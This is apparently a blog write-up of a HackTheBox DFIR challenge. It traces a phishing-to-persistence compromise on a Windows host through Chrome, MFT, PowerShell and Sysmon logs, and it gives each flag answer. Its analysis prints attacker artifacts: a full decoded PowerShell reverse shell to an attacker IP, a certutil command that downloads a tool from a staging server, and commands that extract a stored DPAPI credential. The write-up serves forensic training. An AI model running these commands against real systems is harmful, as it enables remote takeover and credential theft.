---
title: "HTB DFIR Sherlock: ShadowBait"
type: "posts"
author: WildPasta
author_url: "https://medium.com/@wildpasta"
published: 2026-08-31
source: Medium
draft: false
toc: false
categories: ["writeups"]
tags: ["hackthebox", "dfir", "writeups"]
---

### HTB DFIR Sherlock: ShadowBait

Here we go again for a DFIR box. You are involved in an incident response where a junior consultant downloaded a document that lead to a whole compromission. You are going to see an investigation that dives into browser artifacts, a lot of powershell event logs and some basic persistence on Windows.

---

> Task 1: What is the name of the malicious document used in phishing, which facilitated initial access for the attacker?

Steven downloaded a malicious file that started it all! The first place to look is his web browser (Chrome). As any web browser, history, downloads, bookmarks (and so much more) are simple sqlite databases located in `%localappdata%\google\chrome\user data\default\`. 

Looking at the *History* file and in the `downloads` tab, it appears that steven downloaded a file named `Policy.docm`. This extension indicates that it is a Microsoft Word document supporting macros: likely what lead to the compromise.

{{< image src="images/Chrome_download_history__part__1__7976.png" alt="Chrome download history (part. 1)" caption="Chrome download history (part. 1)" >}}

{{< admonition type=success title="FLAG" open=false >}}
Policy.docm
{{< /admonition >}}

The download time can be determined by running the following command. This timestamp will be used to mark the beginning of the compromise.

```powershell
([DateTime]'1601-01-01').AddMilliseconds(13393748295480732 / 1000)
#output: 7 june 2025 05:38:15
```

This is our initial compromission timestamp. From this time, every action on the host must be considered malicious.

{{< style "height:2rem;" >}}{{< /style >}}
> Task 2: What was the full link from which the malicious document was downloaded?

Still in our Chrome database, you have to look for the `tab_url` column to find the source of our malicious document.

{{< image src="images/Chrome_download_history__part__2__327.png" alt="Chrome download history (part. 2)" caption="Chrome download history (part. 2)" >}}

A google drive link was used to bait Steven: spearphishing link tactic ([T1566.002](https://attack.mitre.org/techniques/T1566/002/)).

{{< admonition type=success title="FLAG" open=false >}}
https://drive.usercontent.google.com/uc?id=1Y6XAccvtdWvXUGx8WU0qG-7EP781c0uD&export=download
{{< /admonition >}}

{{< style "height:2rem;" >}}{{< /style >}}
> Task 3: The document downloaded a script, which acted as a stager and downloaded another payload, providing the attacker with hands-on remote access. When was this script downloaded?

We filter out MFT logs on the `.ps1` extension since we know we're looking for a script. In 90% of the case it means one thing: **powershell**. 

BINGO, there is only one script that appears in Steven's download folder and that's the one we are looking for 🎯!

{{< image src="images/MFT_logs_displaying_powershell_dropper_s_3234.png" alt="MFT logs displaying powershell dropper script location" caption="Powershell dropper script (source: MFT)" >}}

So as you can see on the screenshot, the **downloader.ps1** script was downloaded on 2025–06–07 05:42:11. Another timestamp to add to our compromission timeline.

{{< admonition type=success title="FLAG" open=false >}}
2025–06–07 05:42:11
{{< /admonition >}}

{{< style "height:2rem;" >}}{{< /style >}}
> Task 4: What is the full path of the final payload which provided remote access to the attacker?

Regular powershell command line is logged into **WindowsPowershell EVTX** but powershell scripts block are logged in a dedicated log file: **PowershellOperational EVTX**. 

In the PowershellOperational journal, we can identify the content of the script ran by the `dowloader.ps1`. Here you can learn that a suspicious **opendll.exe** was downloaded from 192.168.204.152 on the 2025–06–07 05:48:00.

{{< image src="images/PowershellOperational_evtx_displaying_co_7841.png" alt="PowershellOperational.evtx displaying content of downloader.ps1" caption="Content of downloader.ps1 (source: PowershellOperational.evtx)" >}}

{{< admonition type=success title="FLAG" open=false >}}
C:\users\Steven\AppData\Roaming\OpenDLL.exe
{{< /admonition >}}

{{< style "height:2rem;" >}}{{< /style >}}
> Task 5: Which port was used for C2 communication by the payload?

Sysmon registered a Network connection (Event ID 3) at **05:48:02** which is right after the **opendll.exe download**. We can convert the SysmonOperational EVTX into XML to load it into [SysmonView](https://github.com/nshalabi/SysmonTools) to have a cleaner view.

{{< image src="images/Sysmon_viewer_displaying_network_connect_8197.png" alt="Sysmon viewer displaying network connection of the opendll payload" caption="Network connection of the opendll payload (source: sysmon.evtx)" >}}

You can learn from this event log that the payload came back hitting 192.168.204.152 on port **8899**.

{{< admonition type=success title="FLAG" open=false >}}
8899
{{< /admonition >}}

{{< style "height:2rem;" >}}{{< /style >}}
> Task 6: The threat actor utilized a file created and used by Steven even before the attack. This file allowed the attacker to authenticate as user “Samy”, abusing DPAPI to grab credentials of another user on the same machine. What is the full path of this file?

At first, I went down a nasty rabbit hole looking for a pentesting tool such as [Mimikatz](https://github.com/gentilkiwi/mimikatz) or [SharpDPAPI](https://github.com/GhostPack/SharpDPAPI). But after taking a step back, I came across Steven's Powershell history and a `connection.xml` file:

```powershell
#source: C:\Users\steven\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
cd C:\Users\samy\Documents\
$username = "samy"
$password = Read-Host -Prompt "Enter password for $username" -AsSecureString
$credential = New-Object System.Management.Automation.PSCredential($username, $password)
$credential | Export-Clixml -Path "C:\Users\samy\Documents\connection.xml"
[SNIP]
```

What the commands are doing:
1. Prompt for Samy’s password ;
2. Create a credential object (more specifically a PSCredential object) ;
3. Export the credential to an on-disk XML file. The password is encrypted using DPAPI.

{{< admonition type=success title="FLAG" open=false >}}
C:\Users\Samy\Documents\connection.xml
{{< /admonition >}}

{{< style "height:2rem;" >}}{{< /style >}}
> Task 7: What is the full command used to grab credentials from the “Samy” account?

Still browsing Powershell histories while I'm at it… Samy's also got a weird one:

```powershell
#source: C:\Users\samy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt    
[SNIP]
$cred = Import-Clixml -Path .\connection.xml
$password = $cred.GetNetworkCredential().Password
echo $password
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
```

You can read that the `connection.xml` file found earlier was loaded into a `$cred` variable to **extract the password field**. And then the password is echoed in the terminal! 

That's our credential grabbing flag:

{{< admonition type=success title="FLAG" open=false >}}
```powershell
#don't forget to remove the .\ before submitting flag (because ??)
$cred = Import-Clixml -Path connection.xml
```
{{< /admonition >}}

Execution timestamp is found in PowershellOperation EVTX to confirm the malicious actions: 2025–06–07 05:48:31.

{{< image src="images/PowershellOperational_evtx_displaying_th_1397.png" alt="PowershellOperational.evtx displaying the usage of Import-Clixml by attacker" caption="Usage of Import-Clixml by attacker (source: PowershellOperational.evtx)" >}}

And right after that, the attacker queried a system security policy in the registry to check whether UAC is enabled or disabled. It's a technique used to ensure that the attacker can run processes silently with elevated privileges.

{{< style "height:2rem;" >}}{{< /style >}}
> Task 8: The attacker downloaded a tool from their internal staging server to laterally move and gain remote access as “Samy” user account. What is the full command used to download the tool?

Scrolling down the timeline, you can notice another script ran in PowershellOperational on 2025–06–07 05:48:56 (that said, it was also logged in Security EVTX).

{{< image src="images/PowershellOperational_evtx_showing_downl_6339.png" alt="PowershellOperational.evtx showing download of red teaming tools using certutil" caption="Download of red teaming tools using certutil (source: PowershellOperational.evtx)" >}}

{{< admonition type=success title="FLAG" open=false >}}
"C:\Windows\system32\certutil.exe" -urlcache -f http://192.168.204.152/RunasCs.exe RunasCs.exe
{{< /admonition >}}

Ok we got the flag but what's that binary? It is a tool used to **run specific processes with different permissions** than the user's current logon provides using explicit credentials (source: [Github](https://github.com/antonioCoco/RunasCs)). 

So it will likely be used to lateralize onto Samy's account 👀

{{< style "height:2rem;" >}}{{< /style >}}
> Task 9: What is the password for the user account “Samy”, used by the attacker to gain a remote shell?

Well, well, well, it seems we got that right! In the PowershellOperational (or in Security) logs, you can find the RunasCS command line execution at 2025–06–07 05:50:16.

{{< image src="images/PowershellOperational_evtx_showing_the_u_8702.png" alt="PowershellOperational.evtx showing the usage of RunasCs to login as samy" caption="Usage of RunasCs to login as samy (source: PowershellOperational.evtx)" >}}

On the screenshot above, first, the RunasCs.exe tried to log in as samy with its credentials in plaintext. Then, the **NTLM authentication** request was successful and the attacker was logged in as samy!

{{< admonition type=success title="FLAG" open=false >}}
Winter2025!
{{< /admonition >}}

{{< admonition type=tip title="Extra mile" open=true >}}
About the command line used: it provided Samy's clear-text credentials to impersonate its user. Then `cmd -r IP:PORT` effectively **creates a reverse shell** on the attacker's IP that we already found previously. And the `--logon-type 8` means we're using plaintext credentials ([NetworkCleartext](https://learn.microsoft.com/en-us/windows-server/identity/securing-privileged-access/reference-tools-logon-types)).
{{< /admonition >}}

{{< style "height:2rem;" >}}{{< /style >}}
> Task 10: After gaining access as Samy, the attacker downloaded a script to check privileges for the account. What is the name of the script?

A bit later, another `certutil.exe` was called to download a new suspicious file.

{{< image src="images/Screenshot_showing_certutil_download_of__9427.png" alt="Screenshot showing certutil download of psgetsys.ps1 (source: sysmon.evtx)" caption="Download of psgetsys.ps1 (source: sysmon.evtx)" >}}

[Psgetsys script](https://github.com/decoder-it/psgetsystem/tree/master) is used by intruder for **easy LPE** on hosts without any kind of protection. It impersonate user by using **parent process spoofing**.

{{< admonition type=success title="FLAG" open=false >}}
psgetsys.ps1
{{< /admonition >}}

{{< style "height:2rem;" >}}{{< /style >}}
> Task 11: The attacker exploited a Windows process to gain an elevated remote shell. What is the PID of this process?

At the beginning of investigation, I like to run a [chainsaw analysis](https://github.com/WithSecureLabs/chainsaw) to have some timeline already formatted.

```powershell
chainsaw hunt ShadowBait\G\Windows\System32\winevt\ -s sigma-rules\ --mapping mappings\sigma-event-logs-all.yml -r .\rules\ --csv --output ShadowBait\chainsaw_output\ --skip-errors
```

It becomes handy in this case because chainsaw displayed a log reading "Abused Debug Privilege by Arbitrary Parent Processes" at 2025–06–07 05:54:10 (source: `sigma.csv`).

And guess what? Around this time, a `winlogon.exe` spawned a reverse shell 🤯!

{{< image src="images/Psgetsys_ps1_command_line_impersonating__8779.png" alt="Psgetsys.ps1 command line impersonating PPID 632 (source: PowershellOperational.evtx)" caption="Psgetsys.ps1 impersonating PPID 632 (source: PowershellOperational.evtx)" >}}

As you can see in the screenshot, the **impersonated process** was the one with **PPID 632** (`winlogon.exe`). Then a base64 encoded payload was run (probably a reverse shell, but let's see about that later).

{{< admonition type=success title="FLAG" open=false >}}
632
{{< /admonition >}}

{{< admonition type=tip title="Extra mile" open=true >}}
In the process creation log of the powershell command, you can see that the parent process is indeed winlogon. The malicious powershell PID is 0x216C in hexadecimal, or 8556 in decimal.
{{< /admonition >}}

{{< image src="images/Malicious_process_PID_created_using_psge_6531.png" alt="Malicious process PID created using psgetsys.ps1" caption="Malicious process PID created using psgetsys.ps1" >}}

{{< style "height:2rem;" >}}{{< /style >}}
> Task 12: Which port was used for remote access with escalated privileges?

Now we can **decipher the Powershell base64** command found in Task 11.

```powershell
#input
[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('<base64>'))
#output
$client = New-Object System.Net.Sockets.TCPClient("192.168.204.152",9006);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

As suspected, it is a classic [revshell payload](https://www.revshells.com/).

{{< admonition type=success title="FLAG" open=false >}}
9006
{{< /admonition >}}

{{< style "height:2rem;" >}}{{< /style >}}
> Task 13: The attacker enabled persistence mechanisms for a backdoor executable. What is the full path of the file?

By browsing the `persistence.csv` tab of the **chainsaw timeline**, you can see that **a scheduled task was created** after the compromise (at 06:00:04). It certainly is suspicious ([MITRE T1053](https://attack.mitre.org/techniques/T1053/)).

{{< image src="images/Intruder_creating_scheduled_task_for_per_9712.png" alt="Intruder creating scheduled task for persistence (source: TaskschedulerOperational.evtx)" caption="Intruder creating scheduled task for persistence (source: TaskschedulerOperational.evtx)" >}}

Let's analyze the content of CheckSystem task:

```xml
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Date>2025-06-07T08:00:04</Date>
    <Author>MAIN\MS01$</Author>
    <URI>\CheckSystem</URI>
  </RegistrationInfo>
  <Triggers>
    <BootTrigger>
      <StartBoundary>2025-06-07T08:00:00</StartBoundary>
      <Enabled>true</Enabled>
    </BootTrigger>
  </Triggers>
  <Settings>
    [SNIP]
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>C:\Windows\system32\document.pdf.exe</Command>
    </Exec>
  </Actions>
  <Principals>
    [SNIP]
  </Principals>
</Task>
Auto (HTML, XML)
```

The file `document.pdf.exe` located in System32 is definitely not legit!

{{< admonition type=success title="FLAG" open=false >}}
C:\Windows\system32\document.pdf.exe
{{< /admonition >}}

{{< admonition type=tip title="Extra mile" open=true >}}
You can also see at 06:03:22 that another persistence was added on host. A **Run registry key was added** to run the malicious binary at startup ([MITRE T1547.001](https://attack.mitre.org/techniques/T1547/)).
{{< /admonition >}}

{{< image src="images/Intruder_creating_registry_run_key_for_p_4293.png" alt="Intruder creating registry run key for persistence (source: PowershellOperational.evtx)" caption="Intruder creating registry run key for persistence (source: PowershellOperational.evtx)" >}}

{{< style "height:2rem;" >}}{{< /style >}}
> Task 14: The attacker also abused Windows shortcuts and placed a rogue shortcut file pointing to the malicious backdoor. What is the shortcut file name?

Here, I unintentionnally did the questions 15 before 14. You see a `script.vbs` download first (2025–06–07 06:03:48) in PowershellOperational EVTX. Then it was executed through powershell interpreter by **cscript.exe** at 06:05:25.

{{< image src="images/Intruder_ran_a_malicious_vbs_script__sou_3043.png" alt="Intruder ran a malicious vbs script (source: PowershellOperational.evtx)" caption="Intruder ran a malicious vbs script (source: PowershellOperational.evtx)" >}}

You have to analyze Sysmon file creation event to see that a shortcut was created at the same timestamp: **NetworkDiagnostics.lnk**. It was created in the **Startup folder** as another **persistence** on the compromised host.

{{< admonition type=success title="FLAG" open=false >}}
NetworkDiagnostics.lnk
{{< /admonition >}}

{{< style "height:2rem;" >}}{{< /style >}}
> Task 15: What is the full path of the script that created the shortcut persistence?

We already spotted the certutil download of `wscript.vbs` in the previous task (PowershellOperation EVTX).

{{< image src="images/Download_of_the_previously_identified_vb_571.png" alt="Download of the previously identified vbs script (source: PowershellOperational.evtx)" caption="Download of the previously identified vbs script (source: PowershellOperational.evtx)" >}}

{{< admonition type=success title="FLAG" open=false >}}
C:\programdata\wscript.vbs
{{< /admonition >}}

---

To wrap it up, I found this box a bit harder than I initially expected. The Sysmon logs were really helpful, but their verbosity sometimes made it easy to miss some key events. Overall, it's a nice Windows box that can be completed fairly quickly if you're familiar with PowerShell logging.

*NB: My write-up are written by myself, without any AI assistance. Excuse my poor english, I chose to share raw content.*

{{< image src="images/ShadowBait_success_banner_412.png" alt="ShadowBait success banner" caption="ShadowBait success banner" >}}
